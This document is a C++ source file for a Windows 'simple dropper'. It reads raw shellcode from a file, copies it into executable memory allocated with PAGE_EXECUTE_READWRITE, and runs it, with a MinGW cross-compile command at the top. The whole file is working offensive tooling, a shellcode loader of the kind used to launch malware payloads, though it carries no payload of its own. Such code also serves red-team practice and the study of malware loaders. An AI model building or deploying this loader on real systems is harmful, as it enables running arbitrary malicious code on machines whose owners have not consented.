// compile with x86_64-w64-mingw32-g++ dropper.cpp -o dropper.exe -static

#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <iomanip>

int main(int argc, char* argv[]) {
    std::cout << "=== SIMPLE DROPPER ===" << std::endl;
    const char* filename = (argc > 1) ? argv[1] : "shellcode.bin";
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "Error - Can't open " << filename << std::endl;
        return -1;
    }
    size_t size = file.tellg();
    file.seekg(0);
    std::vector<unsigned char> shellcode(size);
    file.read(reinterpret_cast<char*>(shellcode.data()), size);
    file.close();
    std::cout << "[+] Shellcode has been loaded: " << size << " bytes" << std::endl;
    LPVOID exec_mem = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    std::cout << "[+] Memory has been allocated: 0x" << std::hex << exec_mem << std::dec << std::endl;
    memcpy(exec_mem, shellcode.data(), size);
    std::cout << "[+] Shellcode has been copied in memory" << std::endl;
    std::cout << "[+] Executing shellcode..." << std::endl;
    ((void(*)())exec_mem)();
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
} 
